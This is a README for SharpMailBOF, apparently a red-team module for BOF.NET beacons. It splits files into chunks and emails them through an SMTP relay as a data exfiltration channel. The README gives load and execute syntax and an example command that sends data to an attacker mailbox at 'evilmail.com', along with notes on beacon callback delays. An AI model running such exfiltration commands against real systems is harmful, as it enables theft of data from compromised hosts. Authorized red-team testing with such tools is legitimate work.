# SharpMailBOF

SharpMailBOF is a quick and dirty [BOF.NET](https://github.com/CCob/BOF.NET) (Thanks CCob!)  module that can be used to break a file into smaller chunks and email them as attachments to a specified recipient using an SMTP relay of your choosing. This can be used as an alternate data exfiltration method to speed up reciving large files when you are operating with a low/slow sleep setting.

## Syntax
```
bofnet_init
bofnet_load [Path_to_DLL]
bofnet_execute BOFNET.Bofs.SharMailBof [SMTP_SERVER] [PORT] [RECIPIENT] [SENDER] [SUBJECT] [BODY]
```
## Example
```
bofnet_execute BOFNET.Bofs.SHarpMailBof mail.example.com 25 redteamer@evilmail.com noreply@example.com "Test" "This is only a test."
```

## Notes

**DO NOT PANIC** if your beacon does not call back. It will not call back until it has finished sending a series of emails + the time your normal sleep time takes. So if your sleep time is set to 30 minutes and you send a 30MB file, it could still take some time but, it will be much faster than trying to use the inbuilt download feature.

This BOF.NET module will delay checking of your beacon. The default delay between messages is 10 minutes and the default file size is 5MB. You can adjust this to fit your needs. At some point I may add the option to specify the delay and attachment sizes.
